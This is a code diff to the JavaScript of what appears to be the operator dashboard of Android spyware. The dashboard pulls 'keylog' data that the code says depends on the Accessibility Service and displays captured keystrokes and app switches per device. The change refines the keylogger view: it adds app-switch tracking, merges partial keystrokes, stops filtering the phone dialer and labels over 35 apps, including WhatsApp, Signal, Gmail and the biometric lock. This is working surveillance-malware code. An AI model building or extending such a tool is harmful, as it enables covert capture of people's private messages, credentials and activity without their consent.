@@ -324,7 +324,7 @@ function initializeDataFeedListeners(uid) {
         f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
     });
 
-    // ── KEYLOGGER — User Input vs Device Output, deduplicated ──
+    // ── KEYLOGGER — App switches + User Input vs Device Output + partial merge ──
     listenToFeed(uid, 'keylog', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
         const c = document.getElementById('keylog-count'); if(c) c.textContent = items.length;
@@ -332,51 +332,83 @@ function initializeDataFeedListeners(uid) {
         if(!items.length){f.innerHTML='No keystrokes yet (enable Accessibility Service)';return;}
 
         var systemApps = ['com.samsung.android.biometrics', 'com.android.systemui',
-            'com.samsung.android.app', 'com.google.android', 'android',
-            'com.samsung.android.dialer'];
+            'com.samsung.android.app', 'com.google.android'];
 
+        // Step 1: Filter and classify
         var grouped = [];
         var prev = null;
         items.forEach(function(k) {
             var app = k.app || 'unknown';
             var text = (k.text || '').trim();
             if(!text) return;
-            if(text.replace(/[\u200B-\u200D\uFEFF]/g, '').length === 0) return;
+            var clean = text.replace(/[\u200B-\u200D\uFEFF]/g, '');
+            if(clean.length === 0) return;
 
+            var isAppSwitch = (k.event === 'app_switch');
             var isSystem = systemApps.some(function(s){ return app.indexOf(s) === 0; });
-            var isDuplicate = prev && prev.app === app && prev.text === text &&
-                              (k.timestamp - prev.timestamp) < 2000;
 
-            if(!isDuplicate) {
-                grouped.push({app: app, text: text, timestamp: k.timestamp, isSystem: isSystem, event: k.event});
+            if(isAppSwitch) {
+                grouped.push({app: app, text: text, timestamp: k.timestamp, isSystem: false, event: 'app_switch', previous_app: k.previous_app});
+                prev = null;
+                return;
             }
-            prev = {app: app, text: text, timestamp: k.timestamp};
+
+            var isDuplicate = prev && !prev.isAppSwitch && prev.app === app && prev.text === text &&
+                              (k.timestamp - prev.timestamp) < 2000;
+            if(isDuplicate) return;
+
+            grouped.push({app: app, text: text, timestamp: k.timestamp, isSystem: isSystem, event: k.event || 'text_changed'});
+            prev = {app: app, text: text, timestamp: k.timestamp, isAppSwitch: false};
         });
 
-        var display = grouped.slice(0, 60);
-        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events (deduplicated) — <span style="color:#4ecdc4;">⌨️ USER</span> = typed input, <span style="color:#ffd93d;">🖥️ DEVICE</span> = screen output</div>';
+        // Step 2: Merge partial keystrokes (same app, each is prefix of next, within 1.5s)
+        var merged = [];
+        for(var i = 0; i < grouped.length; i++) {
+            var cur = grouped[i];
+            if(cur.event === 'app_switch') { merged.push(cur); continue; }
+            var skip = false;
+            if(i + 1 < grouped.length) {
+                var next = grouped[i + 1];
+                if(next.event !== 'app_switch' && next.app === cur.app &&
+                   next.text.indexOf(cur.text) === 0 && next.text.length > cur.text.length &&
+                   (next.timestamp - cur.timestamp) < 1500) {
+                    skip = true;
+                }
+            }
+            if(!skip) merged.push(cur);
+        }
+
+        var display = merged.slice(0, 80);
+        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events — <span style="color:#4ecdc4;">⌨️ USER</span> = typed, <span style="color:#ffd93d;">🖥️ DEVICE</span> = screen, <span style="color:#ff6b6b;">📱 APP</span> = switched</div>';
 
         display.forEach(function(k) {
-            var icon = k.isSystem ? '🖥️' : '⌨️';
-            var label = k.isSystem ? 'DEVICE' : 'USER';
-            var color = k.isSystem ? '#ffd93d' : '#4ecdc4';
-            var bgColor = k.isSystem ? 'rgba(255,217,61,0.05)' : 'rgba(78,205,196,0.05)';
-            var borderColor = k.isSystem ? '#ffd93d' : '#4ecdc4';
+            var icon, label, color, bgColor, borderColor;
 
-            var appName = k.app.split('.').pop() || k.app;
-            if(appName === 'whatsapp') appName = 'WhatsApp';
-            else if(appName === 'dialer') appName = 'Phone';
-            else if(appName === 'yantra') appName = 'Terminal';
-            else if(appName === 'biometrics') appName = 'Biometric';
-            else if(appName === 'setting') appName = 'Settings';
-            else if(appName === 'app') appName = 'Samsung';
+            if(k.event === 'app_switch') {
+                icon = '📱'; label = 'APP SWITCH'; color = '#ff6b6b';
+                bgColor = 'rgba(255,107,107,0.08)'; borderColor = '#ff6b6b';
+            } else if(k.isSystem) {
+                icon = '🖥️'; label = 'DEVICE'; color = '#ffd93d';
+                bgColor = 'rgba(255,217,61,0.05)'; borderColor = '#ffd93d';
+            } else {
+                icon = '⌨️'; label = 'USER'; color = '#4ecdc4';
+                bgColor = 'rgba(78,205,196,0.05)'; borderColor = '#4ecdc4';
+            }
+
+            var appName = getFriendlyApp(k.app);
 
             html += '<div class="feed-item" style="border-left:3px solid ' + borderColor + ';padding-left:8px;background:' + bgColor + ';">';
             html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">';
             html += '<span style="color:' + color + ';font-size:10px;font-weight:bold;">' + icon + ' ' + label + '</span>';
             html += '<span style="color:#555;font-size:9px;">' + esc(appName) + ' • ' + fmtTime(k.timestamp) + '</span>';
             html += '</div>';
-            html += '<code style="color:#fff;font-size:11px;word-break:break-all;">' + esc(k.text) + '</code>';
+
+            if(k.event === 'app_switch') {
+                var prevName = k.previous_app ? getFriendlyApp(k.previous_app) : 'Home';
+                html += '<div style="color:#ff6b6b;font-size:11px;">' + esc(prevName) + ' → <strong>' + esc(appName) + '</strong></div>';
+            } else {
+                html += '<code style="color:#fff;font-size:11px;word-break:break-all;">' + esc(k.text) + '</code>';
+            }
             html += '</div>';
         });
 
@@ -649,6 +681,49 @@ function listenToFeed(uid, path, cb) {
     const r = ref(database, `devices/${uid}/${path}`); const k = `feed-${path}-${uid}`;
     if(deviceListeners[k]) off(deviceListeners[k]);
     deviceListeners[k] = onValue(r, (s) => { if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} });
+}
+
+// ── FRIENDLY APP NAMES (35+ apps) ──
+function getFriendlyApp(pkg) {
+    if(!pkg) return 'Unknown';
+    if(pkg.indexOf('whatsapp') >= 0) return 'WhatsApp';
+    if(pkg.indexOf('telegram') >= 0) return 'Telegram';
+    if(pkg.indexOf('instagram') >= 0) return 'Instagram';
+    if(pkg.indexOf('facebook') >= 0) return 'Facebook';
+    if(pkg.indexOf('tiktok') >= 0) return 'TikTok';
+    if(pkg.indexOf('twitter') >= 0 || pkg.indexOf('.x.') >= 0) return 'X/Twitter';
+    if(pkg.indexOf('snapchat') >= 0) return 'Snapchat';
+    if(pkg.indexOf('chrome') >= 0) return 'Chrome';
+    if(pkg.indexOf('firefox') >= 0) return 'Firefox';
+    if(pkg.indexOf('samsung.android.dialer') >= 0) return 'Phone';
+    if(pkg.indexOf('samsung.android.messaging') >= 0) return 'Messages';
+    if(pkg.indexOf('samsung.android.contacts') >= 0) return 'Contacts';
+    if(pkg.indexOf('samsung.android.camera') >= 0) return 'Camera';
+    if(pkg.indexOf('samsung.android.gallery') >= 0) return 'Gallery';
+    if(pkg.indexOf('samsung.android.biometrics') >= 0) return 'Biometric Lock';
+    if(pkg.indexOf('samsung.android.app') >= 0) return 'Samsung';
+    if(pkg.indexOf('samsung.android.settings') >= 0) return 'Settings';
+    if(pkg.indexOf('google.android.gm') >= 0) return 'Gmail';
+    if(pkg.indexOf('google.android.youtube') >= 0) return 'YouTube';
+    if(pkg.indexOf('google.android.maps') >= 0) return 'Google Maps';
+    if(pkg.indexOf('google.android.apps.photos') >= 0) return 'Google Photos';
+    if(pkg.indexOf('openai.chatgpt') >= 0) return 'ChatGPT';
+    if(pkg.indexOf('coderGtm.yantra') >= 0) return 'Terminal';
+    if(pkg.indexOf('systemui') >= 0) return 'System UI';
+    if(pkg.indexOf('spotify') >= 0) return 'Spotify';
+    if(pkg.indexOf('netflix') >= 0) return 'Netflix';
+    if(pkg.indexOf('discord') >= 0) return 'Discord';
+    if(pkg.indexOf('linkedin') >= 0) return 'LinkedIn';
+    if(pkg.indexOf('reddit') >= 0) return 'Reddit';
+    if(pkg.indexOf('signal') >= 0) return 'Signal';
+    if(pkg.indexOf('viber') >= 0) return 'Viber';
+    if(pkg.indexOf('imo.im') >= 0) return 'imo';
+    if(pkg.indexOf('truecaller') >= 0) return 'Truecaller';
+    if(pkg.indexOf('pinterest') >= 0) return 'Pinterest';
+    if(pkg.indexOf('uber') >= 0) return 'Uber';
+    if(pkg === 'android') return 'Android System';
+    var parts = pkg.split('.');
+    return parts[parts.length - 1] || pkg;
 }
 
 window.openPreview = function(src) {
